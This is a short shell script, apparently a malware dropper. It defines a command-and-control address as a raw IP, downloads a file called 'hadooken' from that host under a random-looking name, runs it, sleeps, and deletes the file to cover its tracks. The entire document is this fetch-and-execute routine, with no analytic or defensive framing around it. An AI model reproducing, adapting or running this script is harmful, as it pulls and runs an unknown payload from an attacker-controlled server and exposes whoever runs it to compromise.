
cc="http://89.185.85.102"
sys="kekenukaxusn"
DIR="/tmp"

m() {
    get $cc/hadooken ./$sys
    ./$sys
    sleep 1
}

m
rm -f ./$sys
